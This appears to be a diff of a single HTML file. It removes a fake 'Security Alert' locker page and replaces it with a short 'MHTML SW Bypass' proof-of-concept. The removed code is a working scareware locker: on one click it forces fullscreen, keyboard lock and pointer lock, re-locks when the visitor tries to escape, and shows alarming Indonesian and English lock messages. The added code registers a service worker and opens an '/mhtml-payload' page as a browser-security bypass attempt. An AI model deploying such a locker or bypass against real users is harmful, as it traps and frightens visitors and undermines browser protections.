@@ -1,210 +1,45 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Security Alert</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  html, body { width: 100%; height: 100%; overflow: hidden; background: #000; }
-  body { cursor: none; font-family: 'Segoe UI', Arial, sans-serif; }
-  #overlay {
-    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-    background: #0a0a0a; color: #fff;
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    z-index: 99999; text-align: center; padding: 20px;
-    user-select: none; -webkit-user-select: none;
-  }
-  #overlay h1 { font-size: 32px; color: #ff0000; margin-bottom: 12px; text-shadow: 0 0 20px #ff0000; }
-  #overlay p { font-size: 15px; color: #aaa; margin-bottom: 20px; max-width: 500px; line-height: 1.5; }
-  #overlay .hint { font-size: 13px; color: #666; margin-top: 30px; animation: pulse 2s infinite; }
-  #overlay .status { font-family: monospace; font-size: 12px; color: #0f0; background: #111; padding: 8px 16px; border-radius: 4px; margin-top: 20px; }
-  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-  #unlockNote { position: fixed; bottom: 10px; left: 10px; font-size: 10px; color: #333; z-index: 100000; font-family: monospace; }
-</style>
-</head>
+<html>
+<head><meta charset="UTF-8"><title>MHTML SW Bypass</title></head>
 <body>
-
-<div id="overlay">
-  <h1>⚠️ Security Alert</h1>
-  <p>Your device has been locked for security verification. Click anywhere to proceed.</p>
-  <p style="font-size: 13px; color: #666;">Sistem mendeteksi aktivitas mencurigakan. Klik di mana saja untuk memverifikasi.</p>
-  <div class="hint">👆 Klik di mana saja untuk melanjutkan</div>
-  <div class="status" id="status">Waiting for click...</div>
-</div>
-
-<div id="unlockNote">Press ESC 3x to unlock (test purpose)</div>
+<h1>MHTML Bypass via Service Worker</h1>
+<button id="start">Start Bypass</button>
+<div id="log"></div>
 
 <script>
-(function() {
-  'use strict';
+document.getElementById('start').addEventListener('click', async () => {
+  const log = (msg) => {
+    document.getElementById('log').innerHTML += '<div>' + msg + '</div>';
+    console.log(msg);
+  };
 
-  var statusEl = document.getElementById('status');
-  var overlay = document.getElementById('overlay');
-  var locked = false;
-  var escCount = 0;
-  var lockAttempts = 0;
-  var maxLockAttempts = 5;
-
-  function setStatus(msg) {
-    statusEl.textContent = msg;
-    console.log('[LOCK] ' + msg);
+  // 1. Register Service Worker
+  if (!('serviceWorker' in navigator)) {
+    log('❌ Service Worker not supported');
+    return;
   }
 
-  // ============================================
-  // ONE-CLICK LOCK FUNCTION
-  // ============================================
-  async function autoLock() {
-    if (locked) return;
-    if (lockAttempts >= maxLockAttempts) {
-      setStatus('Max attempts reached');
-      return;
-    }
-    lockAttempts++;
+  try {
+    const reg = await navigator.serviceWorker.register('/sw.js');
+    log('✅ Service Worker registered');
 
-    setStatus('Activating fullscreen...');
+    // 2. Tunggu sampai SW aktif
+    await navigator.serviceWorker.ready;
+    log('✅ Service Worker ready');
 
-    // STEP 1: Fullscreen (necessary for keyboard lock in Chrome)
-    try {
-      if (!document.fullscreenElement) {
-        if (document.documentElement.requestFullscreen) {
-          await document.documentElement.requestFullscreen();
-        } else if (document.documentElement.webkitRequestFullscreen) {
-          await document.documentElement.webkitRequestFullscreen();
-        }
-        setStatus('✅ Fullscreen active');
-      }
-    } catch (e) {
-      setStatus('⚠️ Fullscreen failed: ' + e.name);
-    }
-
-    // STEP 2: Keyboard Lock (Chrome only, requires fullscreen)
-    setStatus('Locking keyboard...');
-    if (navigator.keyboard && navigator.keyboard.lock) {
-      try {
-        await navigator.keyboard.lock();
-        setStatus('✅ Keyboard LOCKED');
-      } catch (e) {
-        setStatus('⚠️ Keyboard lock failed: ' + e.name);
-      }
+    // 3. Buka MHTML payload via SW
+    log('Opening MHTML payload...');
+    const win = window.open('/mhtml-payload', '_blank');
+    if (!win) {
+      log('❌ Popup blocked');
     } else {
-      setStatus('⚠️ Keyboard lock API unavailable');
+      log('✅ MHTML opened via SW');
     }
 
-    // STEP 3: Pointer Lock
-    setStatus('Locking pointer...');
-    try {
-      if (document.documentElement.requestPointerLock) {
-        var p = document.documentElement.requestPointerLock();
-        if (p && p.then) {
-          await p;
-        }
-        setStatus('✅ Pointer LOCKED');
-      } else if (document.documentElement.webkitRequestPointerLock) {
-        document.documentElement.webkitRequestPointerLock();
-        setStatus('✅ Pointer LOCKED (webkit)');
-      }
-    } catch (e) {
-      setStatus('⚠️ Pointer lock failed: ' + e.name);
-    }
-
-    locked = true;
-    overlay.querySelector('p').textContent = 'System locked. Your input is captured.';
-    overlay.querySelector('.hint').textContent = '🔒 Locked. Press ESC 3 times to unlock (test).';
-    document.body.style.cursor = 'none';
+  } catch (e) {
+    log('❌ Error: ' + e.message);
   }
-
-  // ============================================
-  // UNLOCK FUNCTION
-  // ============================================
-  async function unlockAll() {
-    locked = false;
-    setStatus('Unlocking...');
-
-    // Exit pointer lock
-    if (document.pointerLockElement) {
-      document.exitPointerLock();
-    }
-
-    // Unlock keyboard
-    if (navigator.keyboard && navigator.keyboard.unlock) {
-      try { navigator.keyboard.unlock(); } catch (e) {}
-    }
-
-    // Exit fullscreen
-    if (document.fullscreenElement) {
-      try { await document.exitFullscreen(); } catch (e) {}
-    }
-
-    // Re-trap pointer lock and keyboard lock if still on page? No — let user go.
-    document.body.style.cursor = 'default';
-    setStatus('🔓 Unlocked (test override)');
-    overlay.querySelector('p').textContent = 'Verification complete. You can now leave the page.';
-    overlay.querySelector('.hint').textContent = 'System unlocked.';
-  }
-
-  // ============================================
-  // ATTACH ONE-CLICK TRIGGER (multiple events for reliability)
-  // ============================================
-  function attachTriggers() {
-    var triggers = ['click', 'mousedown', 'pointerdown', 'touchstart'];
-    triggers.forEach(function(evt) {
-      document.addEventListener(evt, function handler(e) {
-        // Once any of these fires, try to lock
-        if (!locked) {
-          e.preventDefault();
-          autoLock();
-        }
-      }, { once: false, capture: true });
-    });
-  }
-
-  // ============================================
-  // RE-LOCK ON ESCAPE ATTEMPT (repeated)
-  // ============================================
-  document.addEventListener('pointerlockchange', function() {
-    if (document.pointerLockElement) {
-      locked = true;
-    } else {
-      // Pointer lock released (ESC pressed?) — try re-lock
-      if (locked && lockAttempts < maxLockAttempts) {
-        setStatus('🔁 Re-locking pointer...');
-        setTimeout(autoLock, 100);
-      }
-    }
-  });
-
-  // Keyboard lock doesn't have a direct event, but we re-apply on keydown
-  document.addEventListener('keydown', function(e) {
-    // If not locked but key pressed, attempt lock
-    if (!locked) {
-      autoLock();
-    }
-    // ESC triple-press to unlock (test escape hatch)
-    if (e.key === 'Escape') {
-      escCount++;
-      if (escCount >= 3) {
-        escCount = 0;
-        unlockAll();
-      } else {
-        setStatus('Press ESC ' + (3 - escCount) + ' more time(s) to unlock');
-      }
-    }
-  }, true);
-
-  // ============================================
-  // INIT
-  // ============================================
-  attachTriggers();
-  setStatus('Ready — click anywhere to lock');
-
-  // Optional: preload fullscreen hint (some browsers require fullscreen first)
-  document.addEventListener('mousemove', function firstMove() {
-    // This is just to log; does NOT grant activation
-    document.removeEventListener('mousemove', firstMove);
-  }, { once: true });
-
-})();
+});
 </script>
 </body>
 </html>
